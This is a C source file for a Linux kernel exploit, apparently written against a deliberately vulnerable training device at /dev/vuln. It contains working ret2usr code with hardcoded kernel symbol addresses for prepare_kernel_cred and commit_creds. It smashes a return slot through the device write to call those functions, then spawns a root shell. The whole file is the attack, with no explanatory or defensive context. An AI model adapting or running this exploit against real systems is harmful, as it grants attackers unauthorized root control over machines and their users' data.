#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#define _GNU_SOURCE

uint64_t prepare_kernel_cred = 0xffffffff810918e0ULL;
uint64_t commit_creds = 0xffffffff81091630ULL;
uint64_t vfs_write_address = 0xffffffff811f5510ULL;

int opend_;
void open_device_state() {
  opend_ = open("/dev/vuln", O_RDWR);
  if (opend_ < 0) {
    printf("[-] unable to open device\n");
  } else {
    printf("[+] device opened\n");
  }
}

void gain_r00t(void) {
  __asm__(".intel_syntax noprefix;"
          "movabs rax, prepare_kernel_cred;"
          "xor rdi, rdi;"
          "call rax;"
          "mov rdi, rax;"
          "movabs rax, commit_creds;"
          "call rax;"
          "add rsp, 56;"
          "movabs rax, vfs_write_address;"
          "push rax;"
          "ret;"
          ".att_syntax;");
}

void smash() {
  uint64_t payload[5];
  payload[4] = (uint64_t)gain_r00t;
  write(opend_, payload, sizeof(payload));
}

int main() {
  open_device_state();
  smash();
  setreuid(0, 0);
  if (getuid() == 0) {
    printf("[+] the flow is defeated!\n");
    char *argvsh[] = {"/bin/sh", NULL};
    execve("/bin/sh", argvsh, 0);
  }
}
